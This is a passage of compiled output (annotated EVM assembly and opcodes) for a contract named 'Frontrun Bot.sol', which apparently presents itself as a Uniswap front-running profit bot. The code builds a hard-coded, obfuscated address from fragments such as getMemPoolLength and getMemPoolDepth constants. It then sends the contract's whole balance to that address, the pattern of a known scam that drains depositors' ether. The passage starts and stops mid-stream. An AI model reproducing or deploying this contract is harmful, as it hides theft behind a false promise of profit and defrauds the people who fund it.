_valueBytes.length */\n      mload\n        /* \"Frontrun Bot.sol\":17921:17931  _baseBytes */\n      dup4\n        /* \"Frontrun Bot.sol\":17921:17938  _baseBytes.length */\n      mload\n        /* \"Frontrun Bot.sol\":17921:17959  _baseBytes.length + _valueBytes.length */\n      add\n        /* \"Frontrun Bot.sol\":17910:17960  new string(_baseBytes.length + _valueBytes.length) */\n      0xffffffffffffffff\n      dup2\n      gt\n        /* \"--CODEGEN--\":5:14   */\n      dup1\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_128\n      jumpi\n        /* \"--CODEGEN--\":27:28   */\n      0x00\n        /* \"--CODEGEN--\":24:25   */\n      dup1\n        /* \"--CODEGEN--\":17:29   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_128:\n        /* \"Frontrun Bot.sol\":17910:17960  new string(_baseBytes.length + _valueBytes.length) */\n      pop\n      mload(0x40)\n      swap1\n      dup1\n      dup3\n      mstore\n      dup1\n      0x1f\n      add\n      not(0x1f)\n      and\n      0x20\n      add\n      dup3\n      add\n      0x40\n      mstore\n      dup1\n      iszero\n      tag_129\n      jumpi\n      dup2\n      0x20\n      add\n        /* \"--CODEGEN--\":29:30   */\n      0x01\n        /* \"--CODEGEN--\":21:27   */\n      dup3\n        /* \"--CODEGEN--\":17:31   */\n      mul\n        /* \"--CODEGEN--\":124:128   */\n      dup1\n        /* \"--CODEGEN--\":108:122   */\n      calldatasize\n        /* \"--CODEGEN--\":100:106   */\n      dup4\n        /* \"--CODEGEN--\":87:129   */\n      calldatacopy\n        /* \"--CODEGEN--\":155:159   */\n      dup1\n        /* \"--CODEGEN--\":147:153   */\n      dup3\n        /* \"--CODEGEN--\":143:160   */\n      add\n        /* \"--CODEGEN--\":133:160   */\n      swap2\n      pop\n        /* \"--CODEGEN--\":0:164   */\n      pop\n        /* \"Frontrun Bot.sol\":17910:17960  new string(_baseBytes.length + _valueBytes.length) */\n      swap1\n      pop\n    tag_129:\n      pop\n        /* \"Frontrun Bot.sol\":17884:17960  string memory _tmpValue = new string(_baseBytes.length + _valueBytes.length) */\n      swap1\n      pop\n        /* \"Frontrun Bot.sol\":17971:17993  bytes memory _newValue */\n      0x60\n        /* \"Frontrun Bot.sol\":18002:18011  _tmpValue */\n      dup2\n        /* \"Frontrun Bot.sol\":17971:18012  bytes memory _newValue = bytes(_tmpValue) */\n      swap1\n      pop\n        /* \"Frontrun Bot.sol\":18026:18032  uint i */\n      0x00\n        /* \"Frontrun Bot.sol\":18043:18049  uint j */\n      dup1\n        /* \"Frontrun Bot.sol\":18069:18070  0 */\n      0x00\n        /* \"Frontrun Bot.sol\":18067:18070  i=0 */\n      swap2\n      pop\n        /* \"Frontrun Bot.sol\":18063:18155  for(i=0; i<_baseBytes.length; i++) {\r... */\n    tag_130:\n        /* \"Frontrun Bot.sol\":18074:18084  _baseBytes */\n      dup6\n        /* \"Frontrun Bot.sol\":18074:18091  _baseBytes.length */\n      mload\n        /* \"Frontrun Bot.sol\":18072:18073  i */\n      dup3\n        /* \"Frontrun Bot.sol\":18072:18091  i<_baseBytes.length */\n      lt\n        /* \"Frontrun Bot.sol\":18063:18155  for(i=0; i<_baseBytes.length; i++) {\r... */\n      iszero\n      tag_131\n      jumpi\n        /* \"Frontrun Bot.sol\":18130:18140  _baseBytes */\n      dup6\n        /* \"Frontrun Bot.sol\":18141:18142  i */\n      dup3\n        /* \"Frontrun Bot.sol\":18130:18143  _baseBytes[i] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_133\n      jumpi\n      invalid\n    tag_133:\n      0x20\n      add\n      add\n      mload\n      0xf8\n      shr\n      0xf8\n      shl\n        /* \"Frontrun Bot.sol\":18113:18122  _newValue */\n      dup4\n        /* \"Frontrun Bot.sol\":18123:18126  j++ */\n      dup3\n      dup1\n      0x01\n      add\n      swap4\n      pop\n        /* \"Frontrun Bot.sol\":18113:18127  _newValue[j++] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_134\n      jumpi\n      invalid\n    tag_134:\n      0x20\n      add\n      add\n        /* \"Frontrun Bot.sol\":18113:18143  _newValue[j++] = _baseBytes[i] */\n      swap1\n      not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)\n      and\n      swap1\n      dup2\n      0x00\n      byte\n      swap1\n      mstore8\n      pop\n        /* \"Frontrun Bot.sol\":18093:18096  i++ */\n      dup2\n      dup1\n      0x01\n      add\n      swap3\n      pop\n      pop\n        /* \"Frontrun Bot.sol\":18063:18155  for(i=0; i<_baseBytes.length; i++) {\r... */\n      jump(tag_130)\n    tag_131:\n        /* \"Frontrun Bot.sol\":18174:18175  0 */\n      0x00\n        /* \"Frontrun Bot.sol\":18172:18175  i=0 */\n      swap2\n      pop\n        /* \"Frontrun Bot.sol\":18168:18262  for(i=0; i<_valueBytes.length; i++) {\r... */\n    tag_135:\n        /* \"Frontrun Bot.sol\":18179:18190  _valueBytes */\n      dup5\n        /* \"Frontrun Bot.sol\":18179:18197  _valueBytes.length */\n      mload\n        /* \"Frontrun Bot.sol\":18177:18178  i */\n      dup3\n        /* \"Frontrun Bot.sol\":18177:18197  i<_valueBytes.length */\n      lt\n        /* \"Frontrun Bot.sol\":18168:18262  for(i=0; i<_valueBytes.length; i++) {\r... */\n      iszero\n      tag_136\n      jumpi\n        /* \"Frontrun Bot.sol\":18236:18247  _valueBytes */\n      dup5\n        /* \"Frontrun Bot.sol\":18248:18249  i */\n      dup3\n        /* \"Frontrun Bot.sol\":18236:18250  _valueBytes[i] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_138\n      jumpi\n      invalid\n    tag_138:\n      0x20\n      add\n      add\n      mload\n      0xf8\n      shr\n      0xf8\n      shl\n        /* \"Frontrun Bot.sol\":18219:18228  _newValue */\n      dup4\n        /* \"Frontrun Bot.sol\":18229:18232  j++ */\n      dup3\n      dup1\n      0x01\n      add\n      swap4\n      pop\n        /* \"Frontrun Bot.sol\":18219:18233  _newValue[j++] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_139\n      jumpi\n      invalid\n    tag_139:\n      0x20\n      add\n      add\n        /* \"Frontrun Bot.sol\":18219:18250  _newValue[j++] = _valueBytes[i] */\n      swap1\n      not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)\n      and\n      swap1\n      dup2\n      0x00\n      byte\n      swap1\n      mstore8\n      pop\n        /* \"Frontrun Bot.sol\":18199:18202  i++ */\n      dup2\n      dup1\n      0x01\n      add\n      swap3\n      pop\n      pop\n        /* \"Frontrun Bot.sol\":18168:18262  for(i=0; i<_valueBytes.length; i++) {\r... */\n      jump(tag_135)\n    tag_136:\n        /* \"Frontrun Bot.sol\":18289:18298  _newValue */\n      dup3\n        /* \"Frontrun Bot.sol\":18275:18299  return string(_newValue) */\n      swap7\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"Frontrun Bot.sol\":17672:18307  function mempool(string memory _base, string memory _value) internal pure returns (string memory) {\r... */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"Frontrun Bot.sol\":11163:11252  function getMemPoolLength() internal pure returns (uint) {\r... */\n    tag_59:\n        /* \"Frontrun Bot.sol\":11214:11218  uint */\n      0x00\n        /* \"Frontrun Bot.sol\":11238:11244  165871 */\n      0x0287ef\n        /* \"Frontrun Bot.sol\":11231:11244  return 165871 */\n      swap1\n      pop\n        /* \"Frontrun Bot.sol\":11163:11252  function getMemPoolLength() internal pure returns (uint) {\r... */\n      swap1\n      jump\t// out\n        /* \"Frontrun Bot.sol\":13804:13893  function getMemPoolHeight() internal pure returns (uint) {\r... */\n    tag_61:\n        /* \"Frontrun Bot.sol\":13855:13859  uint */\n      0x00\n        /* \"Frontrun Bot.sol\":13879:13885  572545 */\n      0x08bc81\n        /* \"Frontrun Bot.sol\":13872:13885  return 572545 */\n      swap1\n      pop\n        /* \"Frontrun Bot.sol\":13804:13893  function getMemPoolHeight() internal pure returns (uint) {\r... */\n      swap1\n      jump\t// out\n        /* \"Frontrun Bot.sol\":17278:17366  function getMemPoolDepth() internal pure returns (uint) {\r... */\n    tag_63:\n        /* \"Frontrun Bot.sol\":17328:17332  uint */\n      0x00\n        /* \"Frontrun Bot.sol\":17352:17358  315395 */\n      0x04d003\n        /* \"Frontrun Bot.sol\":17345:17358  return 315395 */\n      swap1\n      pop\n        /* \"Frontrun Bot.sol\":17278:17366  function getMemPoolDepth() internal pure returns (uint) {\r... */\n      swap1\n      jump\t// out\n        /* \"Frontrun Bot.sol\":15505:15832  function toHexDigit(uint8 d) pure internal returns (byte) {\r... */\n    tag_113:\n        /* \"Frontrun Bot.sol\":15557:15561  byte */\n      0x00\n        /* \"Frontrun Bot.sol\":15583:15584  d */\n      dup2\n        /* \"Frontrun Bot.sol\":15578:15584  0 <= d */\n      0xff\n      and\n        /* \"Frontrun Bot.sol\":15578:15579  0 */\n      0x00\n        /* \"Frontrun Bot.sol\":15578:15584  0 <= d */\n      gt\n      iszero\n        /* \"Frontrun Bot.sol\":15578:15594  0 <= d && d <= 9 */\n      dup1\n      iszero\n      tag_144\n      jumpi\n      pop\n        /* \"Frontrun Bot.sol\":15593:15594  9 */\n      0x09\n        /* \"Frontrun Bot.sol\":15588:15589  d */\n      dup3\n        /* \"Frontrun Bot.sol\":15588:15594  d <= 9 */\n      0xff\n      and\n      gt\n      iszero\n        /* \"Frontrun Bot.sol\":15578:15594  0 <= d && d <= 9 */\n    tag_144:\n        /* \"Frontrun Bot.sol\":15574:15765  if (0 <= d && d <= 9) {\r... */\n      iszero\n      tag_145\n      jumpi\n        /* \"Frontrun Bot.sol\":15642:15643  d */\n      dup2\n        /* \"Frontrun Bot.sol\":15629:15638  byte('0') */\n      0x3000000000000000000000000000000000000000000000000000000000000000\n        /* \"Frontrun Bot.sol\":15623:15639  uint8(byte('0')) */\n      0xf8\n      shr\n        /* \"Frontrun Bot.sol\":15623:15643  uint8(byte('0')) + d */\n      add\n        /* \"Frontrun Bot.sol\":15618:15644  byte(uint8(byte('0')) + d) */\n      0xf8\n      shl\n        /* \"Frontrun Bot.sol\":15611:15644  return byte(uint8(byte('0')) + d) */\n      swap1\n      pop\n      jump(tag_143)\n        /* \"Frontrun Bot.sol\":15574:15765  if (0 <= d && d <= 9) {\r... */\n    tag_145:\n        /* \"Frontrun Bot.sol\":15678:15679  d */\n      dup2\n        /* \"Frontrun Bot.sol\":15666:15680  10 <= uint8(d) */\n      0xff\n      and\n        /* \"Frontrun Bot.sol\":15666:15668  10 */\n      0x0a\n        /* \"Frontrun Bot.sol\":15666:15680  10 <= uint8(d) */\n      gt\n      iszero\n        /* \"Frontrun Bot.sol\":15666:15698  10 <= uint8(d) && uint8(d) <= 15 */\n      dup1\n      iszero\n      tag_147\n      jumpi\n      pop\n        /* \"Frontrun Bot.sol\":15696:15698  15 */\n      0x0f\n        /* \"Frontrun Bot.sol\":15690:15691  d */\n      dup3\n        /* \"Frontrun Bot.sol\":15684:15698  uint8(d) <= 15 */\n      0xff\n      and\n      gt\n      iszero\n        /* \"Frontrun Bot.sol\":15666:15698  10 <= uint8(d) && uint8(d) <= 15 */\n    tag_147:\n        /* \"Frontrun Bot.sol\":15662:15765  if (10 <= uint8(d) && uint8(d) <= 15) {\r... */\n      iszero\n      tag_148\n      jumpi\n        /* \"Frontrun Bot.sol\":15750:15752  10 */\n      0x0a\n        /* \"Frontrun Bot.sol\":15746:15747  d */\n      dup3\n        /* \"Frontrun Bot.sol\":15733:15742  byte('a') */\n      0x6100000000000000000000000000000000000000000000000000000000000000\n        /* \"Frontrun Bot.sol\":15727:15743  uint8(byte('a')) */\n      0xf8\n      shr\n        /* \"Frontrun Bot.sol\":15727:15747  uint8(byte('a')) + d */\n      add\n        /* \"Frontrun Bot.sol\":15727:15752  uint8(byte('a')) + d - 10 */\n      sub\n        /* \"Frontrun Bot.sol\":15722:15753  byte(uint8(byte('a')) + d - 10) */\n      0xf8\n      shl\n        /* \"Frontrun Bot.sol\":15715:15753  return byte(uint8(byte('a')) + d - 10) */\n      swap1\n      pop\n      jump(tag_143)\n        /* \"Frontrun Bot.sol\":15662:15765  if (10 <= uint8(d) && uint8(d) <= 15) {\r... */\n    tag_148:\n        /* \"--CODEGEN--\":12:13   */\n      0x00\n        /* \"--CODEGEN--\":9:10   */\n      dup1\n        /* \"--CODEGEN--\":2:14   */\n      revert\n        /* \"Frontrun Bot.sol\":15505:15832  function toHexDigit(uint8 d) pure internal returns (byte) {\r... */\n    tag_143:\n      swap2\n      swap1\n      pop\n      jump\t// out\n    stop\n    data_6350d1a48231284a8341dbb6cec434401eec03dd1db1d0d6d2f253f7a8b3eca6 53656e64696e672070726f66697473206261636b20746f20636f6e74726163742063726561746f7220616464726573732e2e2e\n    data_a605a138a70f3ae4d1364b0a4be28f180d3f021084227d7f914f61c97fb6a66e 52756e6e696e672046726f6e7452756e2061747461636b206f6e20556e69737761702e20546869732063616e2074616b652061207768696c6520706c6561736520776169742e2e2e\n\n    auxdata: 0xa2646970667358221220c5967cd6e269ed28bae2282a8ba18efad2d4ad27df048e6b552eb8191a513ab364736f6c63430006060033\n}\n",
						"bytecode": {
							"linkReferences": {},
							"object": "",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH3 0x11 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH3 0xFFA CODESIZE SUB DUP1 PUSH3 0xFFA DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE PUSH1 0x40 DUP2 LT ISZERO PUSH3 0x37 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 MLOAD PUSH1 0x40 MLOAD SWAP4 SWAP3 SWAP2 SWAP1 DUP5 PUSH5 0x100000000 DUP3 GT ISZERO PUSH3 0x58 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP4 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP3 ADD DUP6 DUP2 GT ISZERO PUSH3 0x6F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP3 MLOAD DUP7 PUSH1 0x1 DUP3 MUL DUP4 ADD GT PUSH5 0x100000000 DUP3 GT OR ISZERO PUSH3 0x8D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP1 DUP4 MSTORE PUSH1 0x20 DUP4 ADD SWAP3 POP POP POP SWAP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH3 0xC3 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH3 0xA6 JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH3 0xF1 JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP PUSH1 0x40 MSTORE PUSH1 0x20 ADD DUP1 MLOAD PUSH1 0x40 MLOAD SWAP4 SWAP3 SWAP2 SWAP1 DUP5 PUSH5 0x100000000 DUP3 GT ISZERO PUSH3 0x115 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP4 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP3 ADD DUP6 DUP2 GT ISZERO PUSH3 0x12C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP3 MLOAD DUP7 PUSH1 0x1 DUP3 MUL DUP4 ADD GT PUSH5 0x100000000 DUP3 GT OR ISZERO PUSH3 0x14A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP1 DUP4 MSTORE PUSH1 0x20 DUP4 ADD SWAP3 POP POP POP SWAP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH3 0x180 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH3 0x163 JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH3 0x1AE JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP PUSH1 0x40 MSTORE POP POP POP DUP2 PUSH1 0x0 SWAP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 PUSH3 0x1CD SWAP3 SWAP2 SWAP1 PUSH3 0x1EF JUMP JUMPDEST POP DUP1 PUSH1 0x1 SWAP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 PUSH3 0x1E6 SWAP3 SWAP2 SWAP1 PUSH3 0x1EF JUMP JUMPDEST POP POP POP PUSH3 0x29E JUMP JUMPDEST DUP3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 PUSH1 0x1F ADD PUSH1 0x20 SWAP1 DIV DUP2 ADD SWAP3 DUP3 PUSH1 0x1F LT PUSH3 0x232 JUMPI DUP1 MLOAD PUSH1 0xFF NOT AND DUP4 DUP1 ADD OR DUP6 SSTORE PUSH3 0x263 JUMP JUMPDEST DUP3 DUP1 ADD PUSH1 0x1 ADD DUP6 SSTORE DUP3 ISZERO PUSH3 0x263 JUMPI SWAP2 DUP3 ADD JUMPDEST DUP3 DUP2 GT ISZERO PUSH3 0x262 JUMPI DUP3 MLOAD DUP3 SSTORE SWAP2 PUSH1 0x20 ADD SWAP2 SWAP1 PUSH1 0x1 ADD SWAP1 PUSH3 0x245 JUMP JUMPDEST JUMPDEST POP SWAP1 POP PUSH3 0x272 SWAP2 SWAP1 PUSH3 0x276 JUMP JUMPDEST POP SWAP1 JUMP JUMPDEST PUSH3 0x29B SWAP2 SWAP1 JUMPDEST DUP1 DUP3 GT ISZERO PUSH3 0x297 JUMPI PUSH1 0x0 DUP2 PUSH1 0x0 SWAP1 SSTORE POP PUSH1 0x1 ADD PUSH3 0x27D JUMP JUMPDEST POP SWAP1 JUMP JUMPDEST SWAP1 JUMP JUMPDEST PUSH2 0xD4C DUP1 PUSH3 0x2AE PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x43 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x6C02A931 EQ PUSH2 0x4F JUMPI DUP1 PUSH4 0x7B61C320 EQ PUSH2 0xDF JUMPI DUP1 PUSH4 0xBE9A6555 EQ PUSH2 0x16F JUMPI DUP1 PUSH4 0xD4E93292 EQ PUSH2 0x179 JUMPI PUSH2 0x4A JUMP JUMPDEST CALLDATASIZE PUSH2 0x4A JUMPI STOP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x5B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x64 PUSH2 0x183 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP4 DUP2 DUP2 MLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0xA4 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x89 JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0xD1 JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0xEB JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0xF4 PUSH2 0x221 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP4 DUP2 DUP2 MLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x134 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x119 JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0x161 JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x177 PUSH2 0x2BF JUMP JUMPDEST STOP JUMPDEST PUSH2 0x181 PUSH2 0x35A JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 PUSH1 0x1F ADD PUSH1 0x20 DUP1 SWAP2 DIV MUL PUSH1 0x20 ADD PUSH1 0x40 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 ISZERO PUSH2 0x219 JUMPI DUP1 PUSH1 0x1F LT PUSH2 0x1EE JUMPI PUSH2 0x100 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 0x20 ADD SWAP2 PUSH2 0x219 JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 0x1 ADD SWAP1 PUSH1 0x20 ADD DUP1 DUP4 GT PUSH2 0x1FC JUMPI DUP3 SWAP1 SUB PUSH1 0x1F AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP DUP2 JUMP JUMPDEST PUSH1 0x1 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 PUSH1 0x1F ADD PUSH1 0x20 DUP1 SWAP2 DIV MUL PUSH1 0x20 ADD PUSH1 0x40 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 ISZERO PUSH2 0x2B7 JUMPI DUP1 PUSH1 0x1F LT PUSH2 0x28C JUMPI PUSH2 0x100 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 0x20 ADD SWAP2 PUSH2 0x2B7 JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 0x1 ADD SWAP1 PUSH1 0x20 ADD DUP1 DUP4 GT PUSH2 0x29A JUMPI DUP3 SWAP1 SUB PUSH1 0x1F AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP DUP2 JUMP JUMPDEST PUSH32 0xCF34EF537AC33EE1AC626CA1587A0A7E8E51561E5514F8CB36AFA1C5102B3BAB PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x48 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0xCCF PUSH1 0x48 SWAP2 CODECOPY PUSH1 0x60 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH2 0x312 PUSH2 0x3F5 JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC SELFBALANCE SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x357 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH32 0xCF34EF537AC33EE1AC626CA1587A0A7E8E51561E5514F8CB36AFA1C5102B3BAB PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x33 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0xC9C PUSH1 0x33 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH2 0x3AD PUSH2 0x40C JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC SELFBALANCE SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x3F2 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x407 PUSH2 0x402 PUSH2 0x423 JUMP JUMPDEST PUSH2 0x5A0 JUMP JUMPDEST SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x41E PUSH2 0x419 PUSH2 0x423 JUMP JUMPDEST PUSH2 0x5A0 JUMP JUMPDEST SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x60 DUP1 PUSH2 0x474 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x1 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x7800000000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP PUSH2 0x46F PUSH2 0x46A PUSH2 0x7F9 JUMP JUMPDEST PUSH2 0x804 JUMP JUMPDEST PUSH2 0xA76 JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0xFBB2 SWAP1 POP PUSH1 0x0 PUSH2 0x487 PUSH2 0xBD1 JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH3 0x2E8D5 SWAP1 POP PUSH1 0x0 PUSH2 0x49B PUSH2 0xBDC JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH3 0x3DD44 SWAP1 POP PUSH1 0x0 PUSH2 0x4AF PUSH2 0xBE7 JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH3 0x1DDAE SWAP1 POP PUSH1 0x60 PUSH2 0x4CD DUP10 PUSH2 0x4C8 DUP11 PUSH2 0x804 JUMP JUMPDEST PUSH2 0xA76 JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x4EB PUSH2 0x4DD DUP10 PUSH2 0x804 JUMP JUMPDEST PUSH2 0x4E6 DUP10 PUSH2 0x804 JUMP JUMPDEST PUSH2 0xA76 JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x509 PUSH2 0x4FB DUP9 PUSH2 0x804 JUMP JUMPDEST PUSH2 0x504 DUP9 PUSH2 0x804 JUMP JUMPDEST PUSH2 0xA76 JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x527 PUSH2 0x519 DUP8 PUSH2 0x804 JUMP JUMPDEST PUSH2 0x522 DUP8 PUSH2 0x804 JUMP JUMPDEST PUSH2 0xA76 JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x547 PUSH2 0x538 DUP7 DUP7 PUSH2 0xA76 JUMP JUMPDEST 